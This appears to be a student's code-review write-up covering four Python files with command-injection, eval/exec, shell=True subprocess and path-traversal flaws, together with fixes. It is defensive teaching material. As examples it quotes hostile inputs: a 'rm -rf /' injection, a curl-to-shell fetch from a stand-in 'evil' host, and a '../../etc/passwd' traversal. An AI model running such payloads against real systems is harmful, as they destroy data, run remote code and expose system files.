### 2.1 "command_injection.py"

The script contains a command injection vulnerability because unsanitized variables go inside os.system() when it called. On line 7, variable1(cmd) calls os.system(cmd), so any string in cmd is passed straight to the shell. Similarly for line 10 (os.system("ls " + user)) and line 13 (os.system(f"echo {user}")) command string is built using the user variable. In all these three cases, if an attacker can controls cmd or user can also inject shell metacharacters like ;, &&, |, or backticks to run other commands. An example for this would be like "; rm -rf /" or $(curl http://evil/payload | sh). This would execute arbitrary commands with the program’s privileges.
The main issue is treating untrusted input as safe code. A better way would be to avoid os.system() with user input, use subprocess.run([...], shell=False) with an argument list We could also nvalidate or whitelist inputs before you ever build a command.


### 2.2 "eval_exec.py"

This file risks arbitrary code execution by calling eval() and exec() on untrusted input. for example , my_eval(expr) at line 2 calls eval(expr) and my_exec(code) at line 5 calls exec(code) they both evaluate whatever string is passed in. So if an attacker controls expr or code they can execute arbitrary Python statements. For example _import__('os').system('rm -rf /') can give arbitrary Python statements . Line 8 (eval("1 + 2")) is safe because it evaluates a fixed literal rather than external input. The actual problem is treating untrusted data as executable code rather than parsed data. In order to fix this, avoid eval()/exec() on user-supplied strings. If you must parse simple data use ast.literal_eval() which only evaluates Python literals, or implement strict input validation OR whitelisting and sandboxing. Where possible, refactor the code to use explicit parsing or dedicated APIs instead of dynamic evaluation.


### 2.3 "subprocess_pope.py"

The script is vulnerable to command injection via shell invocation where user-controlled data is executed by a shell. Specifically, on line 8 ( popen2) it calls subprocess. Popen("echo " + user, shell=True), and on line 14 (popen4) it calls subprocess.run(["sh","-c","echo " + user], shell=True). In both cases, the command string is built from the user variable and then handed to a shell. Any shell metacharacters in user like , ;, &&, |, $()  will be interpreted thus allowing an attacker to append or replace commands and run arbitrary code with the program’s privileges. But for line 5 (popen1) and line 11 (popen3) they don’t set shell=True, so the shell doesn’t parse the input. line 17 (popen5) and line 20 (popen6) use constants only, so there’s no user controlled content to exploit. Basicaly the vulnerability occurs wherever shell is True and is combined with variable input like lines 8 and 14, because untrusted data is being treated like a shell command.


### 2.4 "path_traversal.py"

The script has path-traversal risks wherever user input is turned into a file path and opened. On line 4 (f = open(user)) uses the filename exactly as provided. So an attacker could pass ../ or an absolute path like ../../etc/passwd. On line 8  "uploads/" + user whichis opener_concat , here we are still trusting the user so ../ can escape the uploads folder. In lines 16–17 which is opener_join_var , os.path.join(base, name) is opened. If name contains traversal tokens or an absolute path, it can override base and break out of the intended directory. In lines 20–21 which is opener_join_varconst, eventhough "downloads" is constant a malicious base can point anywhere. So the opened path may still be outside your safe area. Comparetivly in line 12 (opener_const_concat) and lines 24–25 (opener_join_const) build paths from constants only and are not vulnerable in this form. To fix we can validate filenames against an allowlist, reject .., /, and \ in inputs, and canonicalize the final path like realpath()  Path.resolve() and then verify if it still starts with your approved base directory before calling open().
